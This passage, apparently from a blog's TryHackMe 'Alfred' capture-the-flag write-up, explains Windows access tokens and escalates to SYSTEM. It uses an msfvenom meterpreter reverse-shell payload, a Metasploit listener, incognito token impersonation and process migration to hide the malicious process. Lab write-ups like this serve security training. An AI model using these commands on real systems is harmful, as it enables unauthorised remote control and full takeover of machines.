It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
token of its’ parent which is created by &lt;strong&gt;LSASS.exe&lt;/strong&gt; on logon. However, windows treats all processes as belonging to the 
same generation.&lt;/p&gt;

&lt;h4 id=&quot;what-is-the-lsassexe-&quot;&gt;what is the LSASS.exe ?&lt;/h4&gt;
&lt;p&gt;LSASS.exe, &lt;strong&gt;Local Security Authority Process&lt;/strong&gt;, is responsible for authenticating accounts
in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
authenticates, lsass.exe generates a &lt;strong&gt;user access token&lt;/strong&gt;, which is then used to launch the initial shell. &lt;strong&gt;Other processes that
the account initiates inherit from this token&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;commons&quot;&gt;commons&lt;/h3&gt;
&lt;p&gt;Both Windows and UNIX processes inherit the security settings of the creating process by default.
Signals, Exceptions, and Events.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;

&lt;p&gt;After gaining the initial access to the target machine, the first step will be to check the account’s permissions on the system.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;Run: &lt;strong&gt;whoami /priv&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\Jenkins\workspace\project&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/priv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRIVILEGES&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INFORMATION&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;----------------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Privilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;State&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===============================&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseQuotaPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Adjust&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;memory&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;quotas&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSecurityPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Manage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auditing&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeTakeOwnershipPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Take&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ownership&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;other&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeLoadDriverPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Load&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drivers&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemProfilePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Profile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;performance&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemtimePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;           &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Change&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeProfileSingleProcessPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Profile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;single&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseBasePriorityPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Increase&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scheduling&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreatePagefilePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pagefile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeBackupPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Back&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;up&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directories&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeRestorePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Restore&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;directories&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeShutdownPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Shut&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;down&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeDebugPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;programs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeSystemEnvironmentPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Modify&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;firmware&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeChangeNotifyPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;traverse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;checking&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeRemoteShutdownPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeUndockPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Remove&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;docking&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;station&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeManageVolumePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Perform&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;volume&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;maintenance&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tasks&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Impersonate&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;authentication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreateGlobalPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;objects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Enabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeIncreaseWorkingSetPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Increase&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;working&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeTimeZonePrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Change&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;zone&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                      &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SeCreateSymbolicLinkPrivilege&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Create&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;symbolic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;links&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                     &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Disabled&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Those are the privileges of the current user which are inherited from a group or given to the account when created. 
However, only three of them stated as &lt;em&gt;Enabled&lt;/em&gt;.
&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;https://github.com/gtworek/Priv2Admin&quot;&gt;Here&lt;/a&gt; is the full list of exploitable privileges.
&lt;br /&gt;And &lt;a href=&quot;https://www.exploit-db.com/papers/42556&quot;&gt;here&lt;/a&gt; is the detailed documentation of abusing token privileges.
&lt;br /&gt;Also a great video resource &lt;a href=&quot;https://www.youtube.com/watch?v=QRpfvmMbDMg&quot;&gt;here&lt;/a&gt; about token handling vulnerabilities.&lt;/p&gt;

&lt;p&gt;We will need a module called &lt;a href=&quot;https://labs.f-secure.com/archive/incognito-v2-0-released/&quot;&gt;incognito&lt;/a&gt;.
Therefore I will use &lt;strong&gt;Metasploit Framework&lt;/strong&gt; while it has the incognito module built-in.&lt;/p&gt;

&lt;p&gt;The one I will be exploiting is the &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt;.
Follow these steps to get &lt;a href=&quot;https://superuser.com/questions/471769/what-is-the-nt-authority-system-user&quot;&gt;NT AUTHORITY\SYSTEM&lt;/a&gt; privileges.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Create a meterpreter reverse shell binary.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 &lt;span class=&quot;nt&quot;&gt;--encoder&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;THM IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;SOME FREE PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ashell.exe&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Upload the executable to the target machine.&lt;/li&gt;
  &lt;li&gt;Start a reverse tcp listener with metasploit:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
msf6 use exploit exploit/multi/handler
msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THM IM&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
msf6 &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;THE PORT DECLARED FOR EXECUTABLE BEFORE&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
msf6 run&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;After successfully receiving the meterpreter console, load the incognito module.
&lt;br /&gt;Run:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf6 load incognito&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
Then, list all the available tokens:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;list_tokens &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There will be a delegation token called “BULTIN\Administrators”. We will impersonate that token.
Delegation and impersonation levels are identical locally.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Run:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;impersonate_token &lt;span class=&quot;s2&quot;&gt;&quot;BUILTIN&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrators&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If everything were successfully done, &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; should be the output of the &lt;strong&gt;getuid&lt;/strong&gt; command.
&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Run &lt;strong&gt;ps&lt;/strong&gt; to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
By doing that, we have camouflaged our malicious process into a safer looking one.
&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;br /&gt;To get the root flag, run:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ystem32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;onfig&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
